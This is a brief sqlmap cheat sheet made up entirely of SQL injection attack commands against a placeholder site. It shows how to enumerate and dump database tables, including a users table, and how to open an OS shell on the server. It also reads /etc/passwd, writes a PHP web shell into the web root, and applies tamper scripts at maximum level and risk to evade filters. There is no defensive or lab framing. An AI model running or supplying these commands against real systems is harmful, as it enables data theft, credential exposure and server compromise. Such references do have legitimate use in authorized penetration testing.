## ========================================
## SQLMAP USAGE
## ========================================

# Basic Scan
sqlmap -u "http://site.com/page?id=1"

# POST Data
sqlmap -u "http://site.com/login" --data="username=admin&password=pass"

# Database Enumeration
sqlmap -u "http://site.com/page?id=1" --dbs
sqlmap -u "http://site.com/page?id=1" -D dbname --tables
sqlmap -u "http://site.com/page?id=1" -D dbname -T tablename --columns
sqlmap -u "http://site.com/page?id=1" -D dbname -T users --dump

# OS Shell
sqlmap -u "http://site.com/page?id=1" --os-shell

# File Operations
sqlmap -u "http://site.com/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://site.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Tamper Scripts
sqlmap -u "http://site.com/page?id=1" --tamper=space2comment
sqlmap -u "http://site.com/page?id=1" --level=5 --risk=3
